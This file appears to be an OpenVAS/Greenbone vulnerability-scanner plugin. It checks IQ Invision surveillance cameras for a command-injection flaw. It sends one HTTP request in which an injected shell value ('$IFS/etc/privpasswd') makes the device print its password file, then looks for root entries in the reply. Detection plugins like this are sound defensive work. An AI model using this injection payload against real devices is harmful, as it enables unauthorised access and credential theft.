if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105107" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_name( "Multiple IQ Invisions Products Command Injection Vulnerability" );
	script_xref( name: "URL", value: "https://media.blackhat.com/us-13/US-13-Heffner-Exploiting-Network-Surveillance-Cameras-Like-A-Hollywood-Hacker-Slides.pdf" );
	script_tag( name: "impact", value: "Exploiting this issue could allow an attacker to execute arbitrary
commands in the context of the affected device." );
	script_tag( name: "vuldetect", value: "Send a HTTP GET request and check the response." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "summary", value: "Multiple IQ Invisions products are prone to a command-injection
vulnerability." );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2014-11-05 11:38:34 +0100 (Wed, 05 Nov 2014)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "IQhttp/banner" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!banner || !ContainsString( banner, "Server: IQhttp" )){
	exit( 0 );
}
url = "/oidtable.cgi?grep='$IFS/etc/privpasswd;'";
if(http_vuln_check( port: port, url: url, pattern: "root:.*:0:[01]:" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 0 );

